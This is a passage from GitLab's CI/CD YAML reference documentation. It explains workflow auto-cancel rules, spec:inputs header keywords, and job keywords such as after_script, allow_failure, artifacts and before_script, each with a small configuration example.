the [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) or
the [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure) features.

**Supported values**:

- `on_new_commit`: [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit)
- `on_job_failure`: [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure)

**Example of `workflow:rules:auto_cancel`**:

YAML Copy to clipboard

```yaml
workflow:
  auto_cancel:
    on_new_commit: interruptible
    on_job_failure: all
  rules:
    - if: $CI_COMMIT_REF_PROTECTED == 'true'
      auto_cancel:
        on_new_commit: none
        on_job_failure: none
    - when: always                  # Run the pipeline in other cases

test-job1:
  script: sleep 10
  interruptible: false

test-job2:
  script: sleep 10
  interruptible: true
```

In this example, [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit)
is set to `interruptible` and [`workflow:auto_cancel:on_job_failure`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_job_failure)
is set to `all` for all jobs by default. But if a pipeline runs for a protected branch,
the rule overrides the default with `on_new_commit: none` and `on_job_failure: none`. For example, if a pipeline
is running for:

- A non-protected branch and a new commit is pushed, `test-job1` continues to run and `test-job2` is canceled.
- A protected branch and a new commit is pushed, both `test-job1` and `test-job2` continue to run.

## Header keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#header-keywords "Permalink")

Some keywords must be defined in a header section of a YAML configuration file.
The header must be at the top of the file, separated from the rest of the configuration
with `---`.

### `spec` [Permalink](https://docs.gitlab.com/ci/yaml/\#spec "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.

Add a `spec` section to the header of a YAML file to configure the behavior of a pipeline
when a configuration is added to the pipeline with the `include` keyword.

Specs must be declared at the top of a configuration file, in a header section separated
from the rest of the configuration with `---`.

#### `spec:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputs "Permalink")

You can use `spec:inputs` to define [inputs](https://docs.gitlab.com/ci/yaml/inputs/) for the CI/CD configuration.

Use the interpolation format `$[[ inputs.input-id ]]` to reference the values outside of the header section.
Inputs are evaluated and interpolated when the configuration is fetched during pipeline creation.
When using `inputs`, interpolation completes before the configuration is merged
with the contents of the `.gitlab-ci.yml` file.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A hash of strings representing the expected inputs.

**Example of `spec:inputs`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    environment:
    job-stage:
---

scan-website:
  stage: $[[ inputs.job-stage ]]
  script: ./scan-website $[[ inputs.environment ]]
```

**Additional details**:

- Inputs are mandatory unless you use [`spec:inputs:default`](https://docs.gitlab.com/ci/yaml/#specinputsdefault)
to set a default value. Avoid mandatory inputs unless you only use inputs with
[`include:inputs`](https://docs.gitlab.com/ci/yaml/#includeinputs).
- Inputs expect strings unless you use [`spec:inputs:type`](https://docs.gitlab.com/ci/yaml/#specinputstype) to set a
different input type.
- A string containing an interpolation block must not exceed 1 MB.
- The string inside an interpolation block must not exceed 1 KB.
- You can define input values [when running a new pipeline](https://docs.gitlab.com/ci/inputs/#for-a-pipeline).

**Related topics**:

- [Define input parameters with `spec:inputs`](https://docs.gitlab.com/ci/inputs/#define-input-parameters-with-specinputs).

##### `spec:inputs:default` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsdefault "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/391331) in GitLab 15.11 as a beta feature.

Inputs are mandatory when included, unless you set a default value with `spec:inputs:default`.

Use `default: ''` to have no default value.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A string representing the default value, or `''`.

**Example of `spec:inputs:default`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    website:
    user:
      default: 'test-user'
    flags:
      default: ''
title: The pipeline configuration would follow...
---
```

In this example:

- `website` is mandatory and must be defined.
- `user` is optional. If not defined, the value is `test-user`.
- `flags` is optional. If not defined, it has no value.

**Additional details**:

- The pipeline fails with a validation error when the input:
  - Uses both `default` and [`options`](https://docs.gitlab.com/ci/yaml/#specinputsoptions), but the default value
    is not one of the listed options.
  - Uses both `default` and `regex`, but the default value does not match the regular expression.
  - Value does not match the [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype).

##### `spec:inputs:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsdescription "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/415637) in GitLab 16.5.

Use `description` to give a description to a specific input. The description does
not affect the behavior of the input and is only used to help users of the file
understand the input.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: A string representing the description.

**Example of `spec:inputs:description`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    flags:
      description: 'Sample description of the `flags` input details.'
title: The pipeline configuration would follow...
---
```

##### `spec:inputs:options` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsoptions "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/393401) in GitLab 16.6.

Inputs can use `options` to specify a list of allowed values for an input.
The limit is 50 options per input.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: An array of input options.

**Example of `spec:inputs:options`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    environment:
      options:
        - development
        - staging
        - production
title: The pipeline configuration would follow...
---
```

In this example:

- `environment` is mandatory and must be defined with one of the values in the list.

**Additional details**:

- The pipeline fails with a validation error when:
  - The input uses both `options` and [`default`](https://docs.gitlab.com/ci/yaml/#specinputsdefault), but the default value
    is not one of the listed options.
  - Any of the input options do not match the [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype), which can
    be either `string` or `number`, but not `boolean` when using `options`.

##### `spec:inputs:regex` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputsregex "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/410836) in GitLab 16.5.

Use `spec:inputs:regex` to specify a regular expression that the input must match.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: Must be a regular expression.

**Example of `spec:inputs:regex`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    version:
      regex: ^v\d\.\d+(\.\d+)?$
title: The pipeline configuration would follow...
---
```

In this example, inputs of `v1.0` or `v1.2.3` match the regular expression and pass validation.
An input of `v1.A.B` does not match the regular expression and fails validation.

**Additional details**:

- `inputs:regex` can only be used with a [`type`](https://docs.gitlab.com/ci/yaml/#specinputstype) of `string`,
not `number` or `boolean`.
- Do not enclose the regular expression with the `/` character. For example, use `regex.*`,
not `/regex.*/`.
- `inputs:regex` uses [RE2](https://github.com/google/re2/wiki/Syntax) to parse regular expressions.

##### `spec:inputs:type` [Permalink](https://docs.gitlab.com/ci/yaml/\#specinputstype "Permalink")

By default, inputs expect strings. Use `spec:inputs:type` to set a different required
type for inputs.

**Keyword type**: Header keyword. `spec` must be declared at the top of the configuration file,
in a header section.

**Supported values**: Can be one of:

- `array`, to accept an [array](https://docs.gitlab.com/ci/inputs/#array-type) of inputs.
- `string`, to accept string inputs (default when not defined).
- `number`, to only accept numeric inputs.
- `boolean`, to only accept `true` or `false` inputs.

**Example of `spec:inputs:type`**:

YAML Copy to clipboard

```yaml
spec:
  inputs:
    job_name:
    website:
      type: string
    port:
      type: number
    available:
      type: boolean
    array_input:
      type: array
title: The pipeline configuration would follow...
---
```

## Job keywords [Permalink](https://docs.gitlab.com/ci/yaml/\#job-keywords "Permalink")

The following topics explain how to use keywords to configure CI/CD pipelines.

### `after_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#after_script "Permalink")

History

- Running `after_script` commands for canceled jobs [introduced](https://gitlab.com/groups/gitlab-org/-/epics/10158) in GitLab 17.0.

Use `after_script` to define an array of commands to run last, after a job’s `before_script` and
`script` sections complete. `after_script` commands also run when:

- The job is canceled while the `before_script` or `script` sections are still running.
- The job fails with failure type of `script_failure`, but not [other failure types](https://docs.gitlab.com/ci/yaml/#retrywhen).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `after_script`**:

YAML Copy to clipboard

```yaml
job:
  script:
    - echo "An example script section."
  after_script:
    - echo "Execute this command after the `script` section completes."
```

**Additional details**:

Scripts you specify in `after_script` execute in a new shell, separate from any
`before_script` or `script` commands. As a result, they:

- Have the current working directory set back to the default (according to the [variables which define how the runner processes Git requests](https://docs.gitlab.com/ci/runners/configure_runners/#configure-runner-behavior-with-variables)).
- Don’t have access to changes done by commands defined in the `before_script` or `script`,
including:
  - Command aliases and variables exported in `script` scripts.
  - Changes outside of the working tree (depending on the runner executor), like
    software installed by a `before_script` or `script` script.
- Have a separate timeout. For GitLab Runner 16.4 and later, this defaults to 5 minutes, and can be configured with the
[`RUNNER_AFTER_SCRIPT_TIMEOUT`](https://docs.gitlab.com/ci/runners/configure_runners/#set-script-and-after_script-timeouts) variable.
In GitLab 16.3 and earlier, the timeout is hard-coded to 5 minutes.
- Don’t affect the job’s exit code. If the `script` section succeeds and the
`after_script` times out or fails, the job exits with code `0` ( `Job Succeeded`).
- There is a known issue with using [CI/CD job tokens](https://docs.gitlab.com/ci/jobs/ci_job_token/) with `after_script`.
You can use a job token for authentication in `after_script` commands, but the token
immediately becomes invalid if the job is canceled. See [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/473376)
for more details.

For jobs that time out:

- `after_script` commands do not execute by default.
- You can [configure timeout values](https://docs.gitlab.com/ci/runners/configure_runners/#ensuring-after_script-execution) to ensure `after_script` runs by setting appropriate `RUNNER_SCRIPT_TIMEOUT` and `RUNNER_AFTER_SCRIPT_TIMEOUT` values that don’t exceed the job’s timeout.

**Related topics**:

- [Use `after_script` with `default`](https://docs.gitlab.com/ci/yaml/script/#set-a-default-before_script-or-after_script-for-all-jobs)
to define a default array of commands that should run after all jobs.
- You can configure a job to [skip `after_script` commands if the job is canceled](https://docs.gitlab.com/ci/yaml/script/#skip-after_script-commands-if-a-job-is-canceled).
- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `after_script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.
- You can [ignore errors in `after_script`](https://docs.gitlab.com/ci/runners/configure_runners/#ignore-errors-in-after_script).

### `allow_failure` [Permalink](https://docs.gitlab.com/ci/yaml/\#allow_failure "Permalink")

Use `allow_failure` to determine whether a pipeline should continue running when a job fails.

- To let the pipeline continue running subsequent jobs, use `allow_failure: true`.
- To stop the pipeline from running subsequent jobs, use `allow_failure: false`.

When jobs are allowed to fail ( `allow_failure: true`) an orange warning (
status\_warning)
indicates that a job failed. However, the pipeline is successful and the associated commit
is marked as passed with no warnings.

This same warning is displayed when:

- All other jobs in the stage are successful.
- All other jobs in the pipeline are successful.

The default value for `allow_failure` is:

- `true` for [manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
- `false` for jobs that use `when: manual` inside [`rules`](https://docs.gitlab.com/ci/yaml/#rules).
- `false` in all other cases.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` or `false`.

**Example of `allow_failure`**:

YAML Copy to clipboard

```yaml
job1:
  stage: test
  script:
    - execute_script_1

job2:
  stage: test
  script:
    - execute_script_2
  allow_failure: true

job3:
  stage: deploy
  script:
    - deploy_to_staging
  environment: staging
```

In this example, `job1` and `job2` run in parallel:

- If `job1` fails, jobs in the `deploy` stage do not start.
- If `job2` fails, jobs in the `deploy` stage can still start.

**Additional details**:

- You can use `allow_failure` as a subkey of [`rules`](https://docs.gitlab.com/ci/yaml/#rulesallow_failure).
- If `allow_failure: true` is set, the job is always considered successful, and later jobs with [`when: on_failure`](https://docs.gitlab.com/ci/yaml/#when) don’t start if this job fails.
- You can use `allow_failure: false` with a manual job to create a [blocking manual job](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs).
A blocked pipeline does not run any jobs in later stages until the manual job
is started and completes successfully.

#### `allow_failure:exit_codes` [Permalink](https://docs.gitlab.com/ci/yaml/\#allow_failureexit_codes "Permalink")

Use `allow_failure:exit_codes` to control when a job should be
allowed to fail. The job is `allow_failure: true` for any of the listed exit codes,
and `allow_failure` false for any other exit code.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A single exit code.
- An array of exit codes.

**Example of `allow_failure`**:

YAML Copy to clipboard

```yaml
test_job_1:
  script:
    - echo "Run a script that results in exit code 1. This job fails."
    - exit 1
  allow_failure:
    exit_codes: 137

test_job_2:
  script:
    - echo "Run a script that results in exit code 137. This job is allowed to fail."
    - exit 137
  allow_failure:
    exit_codes:
      - 137
      - 255
```

### `artifacts` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifacts "Permalink")

History

- [Updated](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5543) in GitLab Runner 18.1. During the caching process,
`symlinks` are no longer followed, which happened in some edge cases with previous GitLab Runner versions.

Use `artifacts` to specify which files to save as [job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/).
Job artifacts are a list of files and directories that are
attached to the job when it [succeeds, fails, or always](https://docs.gitlab.com/ci/yaml/#artifactswhen).

The artifacts are sent to GitLab after the job finishes. They are
available for download in the GitLab UI if the size is smaller than the
[maximum artifact size](https://docs.gitlab.com/user/gitlab_com/#cicd).

By default, jobs in later stages automatically download all the artifacts created
by jobs in earlier stages. You can control artifact download behavior in jobs with
[`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies).

When using the [`needs`](https://docs.gitlab.com/ci/yaml/#needs) keyword, jobs can only download
artifacts from the jobs defined in the `needs` configuration.

Job artifacts are only collected for successful jobs by default, and
artifacts are restored after [caches](https://docs.gitlab.com/ci/yaml/#cache).

[Read more about artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/).

#### `artifacts:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactspaths "Permalink")

Paths are relative to the project directory ( `$CI_PROJECT_DIR`) and can’t directly
link outside it.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of file paths, relative to the project directory.
- You can use Wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) patterns and [`doublestar.Glob`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#Match) patterns.
- For [GitLab Pages job](https://docs.gitlab.com/ci/yaml/#pages):
  - In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
    the [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) path is automatically appended to `artifacts:paths`,
    so you don’t need to specify it again.
  - In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
    when the [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) path is not specified,
    the `public` directory is automatically appended to `artifacts:paths`.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `artifacts:paths`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    paths:
      - binaries/
      - .config
```

This example creates an artifact with `.config` and all the files in the `binaries` directory.

**Additional details**:

- If not used with [`artifacts:name`](https://docs.gitlab.com/ci/yaml/#artifactsname), the artifacts file
is named `artifacts`, which becomes `artifacts.zip` when downloaded.

**Related topics**:

- To restrict which jobs a specific job fetches artifacts from, see [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies).
- [Create job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#create-job-artifacts).

#### `artifacts:exclude` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexclude "Permalink")

Use `artifacts:exclude` to prevent files from being added to an artifacts archive.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of file paths, relative to the project directory.
- You can use Wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) or
[`doublestar.PathMatch`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#PathMatch) patterns.

**Example of `artifacts:exclude`**:

YAML Copy to clipboard

```yaml
artifacts:
  paths:
    - binaries/
  exclude:
    - binaries/**/*.o
```

This example stores all files in `binaries/`, but not `*.o` files located in
subdirectories of `binaries/`.

**Additional details**:

- `artifacts:exclude` paths are not searched recursively.
- Files matched by [`artifacts:untracked`](https://docs.gitlab.com/ci/yaml/#artifactsuntracked) can be excluded using
`artifacts:exclude` too.

**Related topics**:

- [Exclude files from job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#without-excluded-files).

#### `artifacts:expire_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexpire_in "Permalink")

Use `expire_in` to specify how long [job artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/) are stored before
they expire and are deleted. The `expire_in` setting does not affect:

- Artifacts from the latest job, unless keeping the latest job artifacts is disabled
[at the project level](https://docs.gitlab.com/ci/jobs/job_artifacts/#keep-artifacts-from-most-recent-successful-jobs)
or [instance-wide](https://docs.gitlab.com/administration/settings/continuous_integration/#keep-artifacts-from-latest-successful-pipelines).

After their expiry, artifacts are deleted hourly by default (using a cron job), and are not
accessible anymore.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The expiry time. If no unit is provided, the time is in seconds.
Valid values include:

- `'42'`
- `42 seconds`
- `3 mins 4 sec`
- `2 hrs 20 min`
- `2h20min`
- `6 mos 1 day`
- `47 yrs 6 mos and 4d`
- `3 weeks and 2 days`
- `never`

**Example of `artifacts:expire_in`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    expire_in: 1 week
```

**Additional details**:

- The expiration time period begins when the artifact is uploaded and stored on GitLab.
If the expiry time is not defined, it defaults to the [instance wide setting](https://docs.gitlab.com/administration/settings/continuous_integration/#set-default-artifacts-expiration).
- To override the expiration date and protect artifacts from being automatically deleted:
  - Select **Keep** on the job page.
  - Set the value of `expire_in` to `never`.
- If the expiry time is too short, jobs in later stages of a long pipeline might try to fetch
expired artifacts from earlier jobs. If the artifacts are expired, jobs that try to fetch
them fail with a [`could not retrieve the needed artifacts` error](https://docs.gitlab.com/ci/jobs/job_artifacts_troubleshooting/#error-message-this-job-could-not-start-because-it-could-not-retrieve-the-needed-artifacts).
Set the expiry time to be longer, or use [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) in later jobs
to ensure they don’t try to fetch expired artifacts.
- `artifacts:expire_in` doesn’t affect GitLab Pages deployments. To configure Pages deployments’ expiry, use [`pages.expire_in`](https://docs.gitlab.com/ci/yaml/#pagesexpire_in).

#### `artifacts:expose_as` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsexpose_as "Permalink")

Use the `artifacts:expose_as` keyword to
[expose job artifacts in the merge request UI](https://docs.gitlab.com/ci/jobs/job_artifacts/#link-to-job-artifacts-in-the-merge-request-ui).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- The name to display in the merge request UI for the artifacts download link.
Must be combined with [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `artifacts:expose_as`**:

YAML Copy to clipboard

```yaml
test:
  script: ["echo 'test' > file.txt"]
  artifacts:
    expose_as: 'artifact 1'
    paths: ['file.txt']
```

**Additional details**:

- Artifacts are saved, but do not display in the UI if the `artifacts:paths` values:
  - Use [CI/CD variables](https://docs.gitlab.com/ci/variables/).
  - Define a directory, but do not end with `/`. For example, `directory/` works with `artifacts:expose_as`,
    but `directory` does not.
  - Start with `./`. For example, `file` works with `artifacts:expose_as`, but `./file` does not.
- A maximum of 10 job artifacts per merge request can be exposed.
- Glob patterns are unsupported.
- If a directory is specified and there is more than one file in the directory,
the link is to the job [artifacts browser](https://docs.gitlab.com/ci/jobs/job_artifacts/#download-job-artifacts).
- If [GitLab Pages](https://docs.gitlab.com/administration/pages/) is enabled, GitLab automatically
renders the artifacts when the artifacts is a single file with one of these extensions:
  - `.html` or `.htm`
  - `.txt`
  - `.json`
  - `.xml`
  - `.log`

**Related topics**:

- [Expose job artifacts in the merge request UI](https://docs.gitlab.com/ci/jobs/job_artifacts/#link-to-job-artifacts-in-the-merge-request-ui).

#### `artifacts:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsname "Permalink")

Use the `artifacts:name` keyword to define the name of the created artifacts
archive. You can specify a unique name for every archive.

If not defined, the default name is `artifacts`, which becomes `artifacts.zip` when downloaded.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- The name of the artifacts archive. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
Must be combined with [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `artifacts:name`**:

To create an archive with a name of the current job:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    name: "job1-artifacts-file"
    paths:
      - binaries/
```

**Related topics**:

- [Use CI/CD variables to define the artifacts configuration](https://docs.gitlab.com/ci/jobs/job_artifacts/#with-variable-expansion)

#### `artifacts:public` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactspublic "Permalink")

History

- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/322454) in GitLab 15.10. Artifacts created with `artifacts:public` before 15.10 are not guaranteed to remain private after this update.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/294503) in GitLab 16.7. Feature flag `non_public_artifacts` removed.

`artifacts:public` is now superseded by [`artifacts:access`](https://docs.gitlab.com/ci/yaml/#artifactsaccess) which
has more options.

Use `artifacts:public` to determine whether the job artifacts should be
publicly available.

When `artifacts:public` is `true` (default), the artifacts in
public pipelines are available for download by anonymous, guest, and reporter users.

To deny read access to artifacts in public
pipelines for anonymous, guest, and reporter users, set `artifacts:public` to `false`:

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` (default if not defined) or `false`.

**Example of `artifacts:public`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    public: false
```

#### `artifacts:access` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsaccess "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/145206) in GitLab 16.11.

Use `artifacts:access` to determine who can access the job artifacts from the GitLab UI
or API. This option does not prevent you from forwarding artifacts to downstream pipelines.

You cannot use [`artifacts:public`](https://docs.gitlab.com/ci/yaml/#artifactspublic) and `artifacts:access` in the same job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `all` (default): Artifacts in a job in public pipelines are available for download by anyone,
including anonymous, guest, and reporter users.
- `developer`: Artifacts in the job are only available for download by users with the Developer role or higher.
- `none`: Artifacts in the job are not available for download by anyone.

**Example of `artifacts:access`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    access: 'developer'
```

**Additional details**:

- `artifacts:access` affects all [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/#artifactsreports) too,
so you can also restrict access to [artifacts for reports](https://docs.gitlab.com/ci/yaml/artifacts_reports/).

#### `artifacts:reports` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsreports "Permalink")

Use [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/artifacts_reports/) to collect artifacts generated by
included templates in jobs.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- See list of available [artifacts reports types](https://docs.gitlab.com/ci/yaml/artifacts_reports/).

**Example of `artifacts:reports`**:

YAML Copy to clipboard

```yaml
rspec:
  stage: test
  script:
    - bundle install
    - rspec --format RspecJunitFormatter --out rspec.xml
  artifacts:
    reports:
      junit: rspec.xml
```

**Additional details**:

- Combining reports in parent pipelines using [artifacts from child pipelines](https://docs.gitlab.com/ci/yaml/#needspipelinejob) is
not supported. Track progress on adding support in [this issue](https://gitlab.com/gitlab-org/gitlab/-/issues/215725).
- To be able to browse and download the report output files, include the [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths) keyword. This uploads and stores the artifact twice.
- Artifacts created for `artifacts: reports` are always uploaded, regardless of the job results (success or failure).
You can use [`artifacts:expire_in`](https://docs.gitlab.com/ci/yaml/#artifactsexpire_in) to set an expiration
date for the artifacts.

#### `artifacts:untracked` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactsuntracked "Permalink")

Use `artifacts:untracked` to add all Git untracked files as artifacts (along
with the paths defined in `artifacts:paths`). `artifacts:untracked` ignores configuration
in the repository’s `.gitignore`, so matching artifacts in `.gitignore` are included.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default if not defined).

**Example of `artifacts:untracked`**:

Save all Git untracked files:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    untracked: true
```

**Related topics**:

- [Add untracked files to artifacts](https://docs.gitlab.com/ci/jobs/job_artifacts/#with-untracked-files).

#### `artifacts:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactswhen "Permalink")

Use `artifacts:when` to upload artifacts on job failure or despite the
failure.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `on_success` (default): Upload artifacts only when the job succeeds.
- `on_failure`: Upload artifacts only when the job fails.
- `always`: Always upload artifacts (except when jobs time out). For example, when
[uploading artifacts](https://docs.gitlab.com/ci/testing/unit_test_reports/#add-screenshots-to-test-reports)
required to troubleshoot failing tests.

**Example of `artifacts:when`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    when: on_failure
```

**Additional details**:

- The artifacts created for [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/#artifactsreports) are always uploaded,
regardless of the job results (success or failure). `artifacts:when` does not change this behavior.

### `before_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#before_script "Permalink")

Use `before_script` to define an array of commands that should run before each job’s
`script` commands, but after [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts) are restored.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `before_script`**:

YAML Copy to clipboard

```yaml
job:
  before_script:
    - echo "Execute this command before any 'script:' commands."
  script:
    - echo "This command executes after the job's 'before_script' commands."
```

**Additional details**:

- Scripts you specify in `before_script` are concatenated with any scripts you specify
in the main [`script`](https://docs.gitlab.com/ci/yaml/#script). The combined scripts execute together in a single shell.
- Using `before_script` at the top level, but not in the `default` section, [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#globally-defined-image-services-cache-before_script-after_script).

**Related topics**:

- [Use `before_script` with `default`](https://docs.gitlab.com/ci/yaml/script/#set-a-default-before_script-or-after_script-for-all-jobs)
to define a default array of commands that should run before the `script` commands in all jobs.
- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `before_script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.

### `cache` [Permalink](https://docs.gitlab.com/ci/yaml/\#cache "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/330047) in GitLab 15.0, caches are not shared between protected and unprotected branches.
- [Updated](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5543) in GitLab Runner 18.1. During the caching process,
`symlinks` are no longer followed, which happened in some edge cases with previous GitLab Runner versions.

Use `cache` to specify a list of files and directories to
cache between jobs. You can only use paths that are in the local working copy.

Caches are:

- Shared between pipelines and jobs.
- By default, not shared between [protected](https://docs.gitlab.com/user/project/repository/branches/protected/) and unprotected branches.
- Restored before [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts).
- Limited to a maximum of four [different caches](https://docs.gitlab.com/ci/caching/#use-multiple-caches).

You can [disable caching for specific jobs](https://docs.gitlab.com/ci/caching/#disable-cache-for-specific-jobs),
for example to override:

- A default cache defined with [`default`](https://docs.gitlab.com/ci/yaml/#default).
- The configuration for a job added with [`include`](https://docs.gitlab.com/ci/yaml/#include).

